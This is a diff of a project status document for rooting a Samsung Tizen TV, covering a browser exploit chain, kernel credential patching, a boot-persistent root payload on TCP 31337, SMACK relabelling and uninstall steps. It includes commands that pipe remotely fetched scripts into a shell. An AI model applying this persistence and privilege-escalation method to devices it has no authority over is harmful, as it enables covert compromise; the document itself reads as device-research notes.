@@ -26,106 +26,34 @@ Do not put dated narrative here; put it in the changelog and link to it.
 
 ## 1. Current state
 
-**STATUS — ROOTED, PERSISTENT, confirmed across an owner-initiated
-TV restart (43 s from first beacon to `31337`, `uid=0`, no PC involvement).**
+**Rooted and persistent.** The TV roots itself during boot through the replaced IL of
+the stock on-boot app `com.samsung.tv.MultiControl-Service`, then serves a command
+channel on TCP 31337 (line protocol, replies end with `__END__`).
 
-The payload's boot sequence needs one fast-exit + AUL relaunch by design: beacons
-showed `attempt=1` → `fast-exit attempt=1` → `start pid=<new>` → `attempt=2` →
-`self-patch uid=0` → `ROOTCHAN 31337 uid=0`.
+| | |
+|---|---|
+| Payload | v9, 19,456 B, md5 `ffdb936f5263a04a26b4727ee8307151` (`server/payload.dll`, source `payload/`) |
+| Boot-to-root | ~40 s, measured 38–47 s across boots, with no PC and no browser |
+| Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
+| Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
+| Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |
 
-Portability (other Tizen 9 TVs): **the method travels, this build does not.**
-`payload.dll` hardcodes `PHYS_OFFSET`, `init_task` and four `task_struct` offsets;
-the browser chain is CVE-2024-2887 and therefore Chromium-120-specific. Gate order
-and what to re-measure: `docs/PORTABILITY.md`; safe first step on a foreign unit is
-`server/probe.html` (runs nothing, logs UA + WasmGC support).
+The boot sequence is deliberate: the first launch after a cold boot usually cannot read
+task memory coherently, so the payload makes one short attempt, exits on purpose, and
+lets AUL relaunch it (~1–4 s). A fresh process re-maps the device and succeeds. Four
+fast attempts are allowed (counter in `/tmp/.dsh_try`, which resets at boot), then a
+long in-process fallback takes over.
 
-**How it was restored (the important correction):** the SMACK problem was solved in
-**userspace**, not kernel memory. From a root shell (op 5) with the patched cred:
+Verified independently: two cold boots after a power-cycle (43 s and 47 s from
+power-on, no PC involvement) and one full run from a stock TV through the one-click
+flow. The sequence of changes that got here is in `CHANGELOG.md`.
 
-```sh
-echo -n "User::Pkg::com.samsung.tv.MultiControl-Service" > /proc/self/attr/current
-curl -s http://<pc>/deploy.sh | sh
-aulctl stop com.samsung.tv.MultiControl-Service; aulctl start com.samsung.tv.MultiControl-Service
-```
+**Fallback if the payload is ever missing:** `python tools/tv_rootwatch.py` with the TV
+browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
+`server/recover.sh` from that shell to reinstall the payload.
 
-`/proc/self/attr/current` **accepts the write** for a root+full-caps task (measured
-twice today; the earlier "denied by smack_onlycap" note came from a shell without
-those caps — always retest that). Once the shell carries the app's label it can
-write the app's `bin/` (the dir is `User::Home` transmute=TRUE, so the new file
-inherits the app label). `deploy.sh` then reports `COPY=ok`, `DLL_LABEL=...::RO`,
-`AOT=disabled`, `BOOT_ROW=ok`. AUL needs an explicit **stop+start** — `reload`
-alone does not restart a running app, which is why the first attempt left the old
-DLL loaded.
-
-**Two traps that cost hours:** the app process `comm` is **`DN_trol-Service`**
-(its exe is `/usr/bin/dotnet-launcher-inhouse`), *not* `MultiControl*` — every
-physical scan for "MultiControl" was doomed. And the app is invisible in the
-browser shell's PID namespace, so `/proc` looks empty while `aulctl status` shows
-it running; use `aulctl status <appid>` for its pid.
-
-Verified end-to-end: `reboot` → 31337 listening **41 s** later → `uid=0`,
-`uptime` 1 min, `/opt/usr/system/dsh_root_proof.txt` rewritten by that boot.
-
-How the mechanism was reached, broken and restored is in
-[`CHANGELOG.md`](CHANGELOG.md); the technical write-up of the label regression is
-[`docs/BOOT-REGRESSION-SMACK.md`](docs/BOOT-REGRESSION-SMACK.md). The short version:
-a root shell can take the app's label via `/proc/self/attr/current`, and the payload
-is then written by `deploy.sh` as the app's own file — the kernel-memory relabel was
-never needed.
-
-Superseded claim: "re-installing is not possible from the browser lane"
-was true *only* while we did not know the userspace relabel works. It does.
-
-Fallback (still valid, still maintained): `python tools/tv_rootwatch.py` with the
-TV browser on `http://<pc>/index.html` roots the stub and hands back a **root
-shell on 127.0.0.1:9999** — use it if the payload is ever missing again, then run
-`server/recover.sh` from that shell.
-**Validated: the one-click path works from a stock TV.** Full cycle run
-end to end: `uninstall.ps1` (stock IL/AOT restored and relabelled, boot row
-verified at 0) → reboot, `31337` stayed closed → `root.ps1` → `RELABEL=ok`,
-`COPY=ok`, `DLL_LABEL=…::RO`, `AOT=disabled`, `BOOT_ROW_COUNT=1`, `DEPLOY_DONE`
-→ reboot → **31337 at 47 s, `uid=0`, no page, no PC**. Four fixes were needed
-along the way: the relabel prelude in the generated deploy script, the `RSET`
-race (client resent it while waiting; server evicted waiting clients), the
-detached `aulctl stop`+`start` (stop blocks while the payload runs), and SQL
-readback verification in deploy/uninstall.
-
-**Before the fix:** `root.ps1` could not root a stock TV as shipped —
-it generated `deploy_local.sh` from `deploy.sh` and ran it from the browser-labelled
-stub, whose SMACK label cannot write the app's `bin/` (`COPY=fail`, the cross-label finding). Fixed: the generated script now begins with a relabel prelude, which works
-because `auto_root.py` patches the stub's cred to uid 0 first, so the forked shell
-is root. Generation is verified (LF-only, `sh -n` clean); the full unattended run
-has not been exercised on a stock TV since the fix — if it ever fails there, the
-symptom will be `RELABEL=fail` followed by `COPY=fail`.
-
-Operational note (cost an afternoon today): the server must not run as a console
-app under a job or Task Scheduler — it is silently terminated when that console or
-job goes away, which makes the TV page go blank. It now runs as task
-`TV-LabServer` via `wscript`; full recipe in `docs/SERVER-HOSTING.md`.
-
-- The TV self-roots during boot via the replaced IL of the stock on-boot app
-  `com.samsung.tv.MultiControl-Service`.
-- Root channel: **TCP 31337**, line protocol, reply ends with `__END__`.
-- Payload: **v9**, 19,456 B, md5 `ffdb936f5263a04a26b4727ee8307151`
-  (`server/payload.dll`, source in `payload/`).
-  v7 = v6 + 31337 peer allowlist (`rootchan.allow`) + 120 s `/dev/video40` open
-  retry. **v8** = direct `real_parent` patch (offsets `0x2F0`/`0x2F4`, needs no
-  comm read) + spaced in-process retries. **v9** = fast-exit retry loop: after a
-  short attempt the app exits on purpose so AUL relaunches it (~1–4 s), because a
-  *fresh process* reads coherent task memory; 4 fast attempts (counter in
-  `/tmp/.dsh_try`) then a long fallback mode. Measured cold boot → root: **38 s**.
-- v6 fixed the warm-restart failure: snapshot existing `PHYRFORK` tasks before
-  forking, scan up to 20 s for a *new* one, validate the cred uid before
-  patching, keep the landmark alive for 120 s (tested 2×: 11 s / 8 s).
-- Verified: two cold boots, a deliberate `kill -9`, and two v6 warm restarts.
-- **Re-verified** after the SMACK-label fix: cold boot →
-  `start uid=5001` → `self-patch uid=0` → `ROOTCHAN 31337 uid=0`; `chan.py "id"`
-  returns `uid=0` under the app's label; kill → AUL restart → re-rooted.
-  Full write-up: `docs/BOOT-REGRESSION-SMACK.md`.
-- The previous payloads (v2 13 KB, v4 16,896 B `B6886C60…`) are broken: they
-  patched a forked child's cred (a **copy**) and rejected LPAE pointers above
-  `0xE0000000`.
-
+Payload lineage (v5 → v9, and what each version fixed) is in `CHANGELOG.md`; the label
+regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.
 ## 2. Target facts
 
 | Item | Value |
@@ -259,7 +187,7 @@ paired). Use it from Python:
 import physmap; print(physmap.reset_stub())   # "OK" / "IDLE" / "no-gateway(...)"
 ```
 
-The next page load then pairs cleanly. `recon/op7_wait.py` calls it
+The next page load then pairs cleanly. The tools call it automatically
 automatically when no live stub answers. Treat a stub as single-use for `op 7`
 and never send FILE (op 8) bytes to a stub that has already been turned into a
 shell - that corrupts the stream and wastes the page load.
@@ -385,19 +313,24 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 
 ## 10. Recovery
 
-- **Payload fails to root at boot, channel down:** the browser path still
-  works. Reload `index.html`, `kernel_root.py --fork`, redeploy. If
-  `/dev/video40` is held by the failed payload, wait ~2 min (it exits) or
-  reboot.
-- **Restore stock app / uninstall:** run `pwsh -File uninstall.ps1 -TvIp <tv-ip>`
-  (uses the 31337 channel, runs `server/uninstall.sh`, md5-checks the backups,
-  restores IL + AOT, removes the boot row unless `-KeepBoot`, reboots and
-  verifies 31337 stays closed). Manual fallback if the channel is down: load
-  `index.html`, `kernel_root.py --fork`, then
-  `run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh"`.
+- **Payload fails to root at boot, channel down:** the browser path still works.
+  Load `index.html` and run `root.ps1` again — or, from a root shell,
+  `server/recover.sh`. If `/dev/video40` is held by the failed payload, wait
+  (~2 min, it exits) or power-cycle.
+- **Restore stock app / uninstall:** `pwsh -File uninstall.ps1 -TvIp <tv-ip>`. It
+  uses the 31337 channel to run `server/uninstall.sh`, which md5-checks and
+  restores the stock IL + AOT (relabelled), deletes the boot row unless
+  `-KeepBoot`, and verifies the table. It then waits through the reboot and
+  confirms 31337 stays closed — **the power-cycle is yours to do**, the script
+  only waits for it. Manual fallback if the channel is down: load `index.html`,
+  `kernel_root.py --fork`, then
+  `run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh" 120` (the default
+  wait is 3 s, far too short).
 - **Backups on the TV:** `mcs_orig.dll` (original IL),
-  `mcs_ni_orig.dll` (original AOT), `bin/.native_image.disabled.<epoch>`,
-  `payload_backup.dll` (our payload).
+  `mcs_ni_orig.dll` (original AOT), `bin/.native_image.disabled.<epoch>`.
+  `payload_backup.dll` is whatever was in `bin/` before the last deploy — it is
+  **not** guaranteed to be stock, so uninstall never uses it (it restores from
+  `mcs_orig.dll` and checks the md5).
 - **Browser stub rebuild:** `tools/physrpc.S` + `tools/build_physrpc.py`; the
   shellcode must then be re-embedded in `browser_payload.js` (manual step).
 
@@ -414,19 +347,9 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   creds were rooted in one pass with no task list at all. The walk is still used
   when it happens to work (fresh stub), and the pid-hash/IDR routes remain
   blocked for the reasons recorded below.
-  **pid-hash/IDR are both blocked (measured):** the shipped `uImage`
-  has no kallsyms (`vmlinux-to-elf` → `0 candidates for kallsyms_token_table`),
-  `/proc/kallsyms` does not exist, and the GPL build is a different kernel whose
-  System.map omits static `pid_hash`/`pidhash_shift` (`init_task` `0xC08F72C0`
-  vs running `0xC0957180`). `init_pid_ns` **was** found via `__ksymtab`
-  (`0xC095CC70`, level 0), but it has no `idr` field — the struct ends after
-  `proc_work`/`pid_allocated`, i.e. `CONFIG_CHECKPOINT_RESTORE` is off, so the
-  IDR route is dead. The comm-scan fallback was then tried and is unreliable:
-  reading past phys `0x46000000` hung the stub twice (once followed by a
-  reboot), and freshly allocated task_structs often read back as `0xff`, so a
-  comm hit does not validate. That is why the cred-content scan above (bounded
-  to `0x40000000`) is the supported route. Probe kept at `tools/find_pidns.py`.
-  See `docs/SCRIPT-REVIEW.md`.
+  pid-hash and IDR locators are both blocked on this kernel (no kallsyms, and
+  `init_pid_ns` has no `idr` field) — the cred-content scan above made them
+  unnecessary. Full reasoning: `docs/SCRIPT-REVIEW.md`.
 - Automate re-embedding the shellcode in `browser_payload.js` after a rebuild.
 - Repoint the remote's app buttons by patching `com.samsung.tv.hotkey-service`
   (see `docs/REMOTE.md`): capture the `XF86AppN` key, decompile the service IL,
